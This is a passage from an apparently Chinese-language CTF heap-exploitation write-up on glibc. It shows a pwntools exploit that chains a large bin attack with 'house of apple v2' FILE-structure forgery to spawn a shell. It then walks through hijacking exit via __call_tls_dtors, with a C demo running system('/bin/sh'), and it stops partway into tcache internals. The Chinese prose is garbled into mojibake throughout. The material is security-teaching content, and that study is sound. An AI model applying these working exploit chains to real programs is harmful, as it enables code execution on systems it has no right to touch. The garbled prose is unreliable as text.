</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x0</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xff0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x8</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xff0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x420</span>: <span style="color:#bd93f9">0x430</span>
</span></span><span style="display:flex;"><span>}, filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x428</span>, payload)
</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">5</span>)
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x428</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 5</span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ## large bin attack =&gt; IO_list_all -&gt; chunk0</span>
</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">5</span>)
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> fit({
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x18</span>: libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>_IO_list_all <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x20</span>,
</span></span><span style="display:flex;"><span>}, filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">4</span>, <span style="color:#8be9fd;font-style:italic">len</span>(payload) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, payload <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">2</span>)
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># # house of apple v2</span>
</span></span><span style="display:flex;"><span>fs <span style="color:#ff79c6">=</span> FileStructure()
</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>vtable <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>_IO_wfile_jumps
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># write_base &lt; write_ptr</span>
</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>_IO_write_base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>_IO_write_ptr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>chain <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># fs._lock = libc.sym._IO_stdfile_2_lock</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># lock æ£€æŸ¥</span>
</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>_lock <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1d5a20</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># # codecvt = ?</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># fs._codecvt = ?</span>
</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>_wide_data <span style="color:#ff79c6">=</span> heap_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xff0</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x500</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytes</span>(fs)[<span style="color:#bd93f9">0x10</span>:]
</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">1</span>, <span style="color:#8be9fd;font-style:italic">len</span>(payload) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, payload <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>wdata <span style="color:#ff79c6">=</span> fit({
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xe0</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x10</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xff0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xe0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x10</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xe0</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x68</span>: libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}, filler<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">4</span>, <span style="color:#8be9fd;font-style:italic">len</span>(wdata) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, wdata <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;heap_addr&#34;</span>)
</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;heap_base&#34;</span>)
</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;leak&#34;</span>)
</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;libc.address&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x4f0</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;     sh;&#34;</span>  <span style="color:#6272a4"># flag rdi</span>
</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(payload), payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># dbg(p)</span>
</span></span><span style="display:flex;"><span>menu(<span style="color:#bd93f9">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>itr()
</span></span></code></pre></div><p>ä¸»è¦åˆ©ç”¨large bin leakï¼Œä½†æ˜¯å› ä¸ºå…¶å¯ä»¥ä½¿ç”¨tcache binï¼Œçœ‹åˆ°äº†å…¶ä»–çš„åˆ©ç”¨æ‰‹æ®µ</p>
<ul>
<li>æœ€ç»ˆtcacheä¿®æ”¹TLSï¼Œé€šè¿‡__call_tls_dtorså‡½æ•°å®ç°system(â€œ/bin/shâ€)</li>
<li>IO leak æ ˆåœ°å€ï¼Œç„¶åè·³è½¬åˆ°æ ˆä¸Šè¿›è¡ŒæŒ‡å‘å‡½æ•°ã€‚</li>
</ul>
<h3 id="tls_dtor">tls_dtor</h3>
<p>ä¸€ç§æ¯”è¾ƒç®€å•çš„åˆ©ç”¨æ‰‹æ®µï¼Œæ­£å¸¸æƒ…å†µä¸‹å­˜åœ¨å¦‚ä¸‹çš„è°ƒç”¨é“¾</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>exit
</span></span><span style="display:flex;"><span>	__run_exit_handlers
</span></span><span style="display:flex;"><span>		__call_tls_dtors
</span></span></code></pre></div><p>å…¶å‡½æ•°å®ç°å¦‚ä¸‹</p>
<ul>
<li>ä¸€ä¸ªå…¨å±€å˜é‡æ˜¯å¦å­˜åœ¨</li>
<li>æ‰¾åˆ°å…¶å‡½æ•°æŒ‡é’ˆ</li>
<li><code>PTR_DEMANGLE</code> è®¡ç®—å‡½æ•°åœ°å€</li>
<li>è°ƒç”¨å‡½æ•°</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">__call_tls_dtors</span> (<span style="color:#8be9fd">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">while</span> (tls_dtor_list)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">dtor_list</span> <span style="color:#ff79c6">*</span>cur <span style="color:#ff79c6">=</span> tls_dtor_list;
</span></span><span style="display:flex;"><span>      dtor_func func <span style="color:#ff79c6">=</span> cur<span style="color:#ff79c6">-&gt;</span>func;
</span></span><span style="display:flex;"><span>      PTR_DEMANGLE (func);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      tls_dtor_list <span style="color:#ff79c6">=</span> tls_dtor_list<span style="color:#ff79c6">-&gt;</span>next;
</span></span><span style="display:flex;"><span>      func (cur<span style="color:#ff79c6">-&gt;</span>obj);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">/* Ensure that the MAP dereference happens before
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 l_tls_dtor_count decrement.  That way, we protect this access from a
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 potential DSO unload in _dl_close_worker, which happens when
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span>
</span></span><span style="display:flex;"><span>      atomic_fetch_add_release (<span style="color:#ff79c6">&amp;</span>cur<span style="color:#ff79c6">-&gt;</span>map<span style="color:#ff79c6">-&gt;</span>l_tls_dtor_count, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>      free (cur);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>libc_hidden_def (__call_tls_dtors)
</span></span></code></pre></div><p>å…¶ç»“æ„ä½“å¦‚ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#50fa7b">void</span> (<span style="color:#ff79c6">*</span>dtor_func) (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// destructor list
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">dtor_list</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  dtor_func func;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>obj;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">link_map</span> <span style="color:#ff79c6">*</span>map;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">dtor_list</span> <span style="color:#ff79c6">*</span>next;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>PTR_DEMANGLE è¿™ä¸ªå®è®¡ç®—å‡½æ•°åœ°å€</p>
<ul>
<li>å¾ªç¯å³ç§»0x11ä½</li>
<li>ä¸ pointer_guard è¿›è¡Œå¼‚æˆ–</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6"># define PTR_DEMANGLE(reg)	ror $2*LP_SIZE+1, reg;			      \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">				xor %fs:POINTER_GUARD, reg
</span></span></span></code></pre></div><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå€¼ä¸º0ï¼Œä¸ä¼šè°ƒç”¨å¦‚ä¸‹çš„å‡½æ•°</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; p tls_dtor_list
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$1</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>struct dtor_list *<span style="color:#ff79c6">)</span> 0x0
</span></span></code></pre></div><p>å› ä¸ºè¿™é‡Œæ²¡æœ‰ä»€ä¹ˆæ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ”»å‡»è¿™ä¸ªå€¼ï¼Œè®©å…¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ä¸€ä¸ª <code>dtor_list</code> ç»“æ„ä½“ã€‚</p>
<ul>
<li>func é¦–å…ˆè·å¾—åœ°å€ï¼Œå…ˆäº pointer_guard è¿›è¡Œå¼‚æˆ–ï¼Œç„¶ååœ¨è¿›è¡Œå¾ªç¯å·¦ç§»11ä½</li>
<li>obj ä½œä¸ºå‡½æ•°å‚æ•°æŒ‡é’ˆã€‚</li>
</ul>
<p>åœ¨æ±‡ç¼–ä¸­</p>
<ul>
<li>tls_dtor_list ä¹Ÿåœ¨ fs é™„è¿‘</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; <span style="color:#8be9fd;font-style:italic">set</span> <span style="color:#8be9fd;font-style:italic">tls_dtor_list</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>   <span style="color:#6272a4"># è¿›å…¥å¾ªç¯ï¼Œå¯»æ‰¾åç§»</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; p <span style="color:#8be9fd;font-style:italic">$rbp</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$4</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>void *<span style="color:#ff79c6">)</span> 0xffffffffffffffb0
</span></span><span style="display:flex;"><span>pwndbg&gt; p <span style="color:#ff79c6">(</span>long<span style="color:#ff79c6">)</span><span style="color:#8be9fd;font-style:italic">$rbp</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$5</span> <span style="color:#ff79c6">=</span> -80
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x7ffff7e02606 &lt;__call_tls_dtors+6&gt;     mov    rbp, qword ptr <span style="color:#ff79c6">[</span>rip + 0x194773<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>0x7ffff7e0260d &lt;__call_tls_dtors+13&gt;    mov    rbx, qword ptr fs:<span style="color:#ff79c6">[</span>rbp<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>0x7ffff7e02612 &lt;__call_tls_dtors+18&gt;    <span style="color:#8be9fd;font-style:italic">test</span>   rbx, rbx                        <span style="color:#6272a4"># è¿™é‡Œå°±æ˜¯tls_dtor_list å€¼</span>
</span></span><span style="display:flex;"><span>0x7ffff7e02615 &lt;__call_tls_dtors+21&gt;    je     __call_tls_dtors+94                &lt;__call_tls_dtors+94&gt;
</span></span><span style="display:flex;"><span>0x7ffff7e02617 &lt;__call_tls_dtors+23&gt;    nop    word ptr <span style="color:#ff79c6">[</span>rax + rax<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>â–º 0x7ffff7e02620 &lt;__call_tls_dtors+32&gt;    mov    rdx, qword ptr <span style="color:#ff79c6">[</span>rbx + 0x18<span style="color:#ff79c6">]</span>   <span style="color:#6272a4"># next æŒ‡é’ˆ</span>
</span></span><span style="display:flex;"><span>0x7ffff7e02624 &lt;__call_tls_dtors+36&gt;    mov    rax, qword ptr <span style="color:#ff79c6">[</span>rbx<span style="color:#ff79c6">]</span>            <span style="color:#6272a4"># func</span>
</span></span><span style="display:flex;"><span>0x7ffff7e02627 &lt;__call_tls_dtors+39&gt;    ror    rax, 0x11                       <span style="color:#6272a4"># å¾ªç¯å³ç§»</span>
</span></span><span style="display:flex;"><span>0x7ffff7e0262b &lt;__call_tls_dtors+43&gt;    xor    rax, qword ptr fs:<span style="color:#ff79c6">[</span>0x30<span style="color:#ff79c6">]</span>        <span style="color:#6272a4"># pointer_guard </span>
</span></span><span style="display:flex;"><span>0x7ffff7e02634 &lt;__call_tls_dtors+52&gt;    mov    qword ptr fs:<span style="color:#ff79c6">[</span>rbp<span style="color:#ff79c6">]</span>, rdx
</span></span><span style="display:flex;"><span>0x7ffff7e02639 &lt;__call_tls_dtors+57&gt;    mov    rdi, qword ptr <span style="color:#ff79c6">[</span>rbx + 8<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; x/xg <span style="color:#8be9fd;font-style:italic">$fs_base</span>+0x30
</span></span><span style="display:flex;"><span>0x7ffff7dc1770: 0x851e64b26accf332
</span></span></code></pre></div><p>æˆ‘ä»¬éœ€è¦å°†ä¼ªé€ çš„ç»“æ„ä½“ä¸­å‡½æ•°åœ°å€è¿›è¡Œä¸€ä¸ªç§»ä½è¿ç®—</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">rol</span>(addr):
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> ((addr <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">0x11</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffffffffffff</span>) <span style="color:#ff79c6">|</span> (addr <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">0x2f</span>)
</span></span></code></pre></div><p>ä¸€ä¸ªå°demoï¼Œæ¥è‡ª <a href="https://zhuanlan.zhihu.com/p/654914149">glibc2.35-é€šè¿‡tls_dtor_liståŠ«æŒexitæ‰§è¡Œæµç¨‹</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#50fa7b">rotate_left</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> value, <span style="color:#8be9fd">int</span> left) {
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> (value <span style="color:#ff79c6">&lt;&lt;</span> left) <span style="color:#ff79c6">|</span> (value <span style="color:#ff79c6">&gt;&gt;</span> (<span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">-</span> left));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> fs_base;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> index <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffffffffffa8</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> tls_dtor_list_addr;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> random_number;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>system_ptr <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>system;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;system:%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, system_ptr);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">asm</span>(<span style="color:#f1fa8c">&#34;mov %%fs:0, %0&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;=r&#34;</span>(fs_base));
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Value in FS register: 0x%llx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, fs_base);
</span></span><span style="display:flex;"><span>  tls_dtor_list_addr <span style="color:#ff79c6">=</span> fs_base <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">80</span>;
</span></span><span style="display:flex;"><span>  random_number <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(fs_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x30</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>str_bin_sh <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x20</span>);
</span></span><span style="display:flex;"><span>  strcpy(str_bin_sh, <span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>ptr <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x20</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)ptr <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      rotate_left((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span>)system_ptr <span style="color:#ff79c6">^</span> random_number, <span style="color:#bd93f9">0x11</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(ptr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">=</span> str_bin_sh;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)tls_dtor_list_addr <span style="color:#ff79c6">=</span> ptr;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>åœ¨é«˜ç‰ˆæœ¬ çš„ tcache bin attack é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚</p>
<ul>
<li>tcache fd åŠ å¯†é—®é¢˜ã€‚</li>
</ul>
<p>å¦‚ä¸‹ä¸º chunk æ”¾å…¥ tcache bin ç›¸å…³çš„å‡½æ•°ã€‚</p>
<ul>
<li>å› ä¸º header çš„å­˜åœ¨ï¼Œç¬¬ä¸€æ­¥å°† chunk è½¬åŒ–æˆ tcache_entry</li>
<li>key ä¸ºä¸€ä¸ªéšæœºæ•°</li>
<li>nextæŒ‡é’ˆè®¡ç®—ï¼ŒnextæŒ‡é’ˆçš„åœ°å€å³ç§»12ä½ï¼Œç„¶åä¸ <code>prev tcache bin</code> æŒ‡é’ˆè¿›è¡Œ <code>xor</code> è¿ç®—ã€‚</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define PROTECT_PTR(pos, ptr) \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">tcache_entry</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">tcache_entry</span> <span style="color:#ff79c6">*</span>next;                <span style="color:#6272a4">// å¸¸è¯´çš„ fd æŒ‡é’ˆ 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">/* This field exists to detect double frees.  */</span>
</span></span><span style="display:flex;"><span>  uintptr_t key;
</span></span><span style="display:flex;"><span>} tcache_entry;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">tcache_perthread_struct</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint16_t</span> counts[TCACHE_MAX_BINS];
</span></span><span style="display:flex;"><span>  tcache_entry <span style="color:#ff79c6">*</span>entries[TCACHE_MAX_BINS];
</span></span><span style="display:flex;"><span>} tcache_perthread_struct;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> __thread tcache_perthread_struct <span style="color:#ff79c6">*</span>tcache <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> __always_inline <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">tcache_put</span>(mchunkptr chunk, size_t tc_idx) {
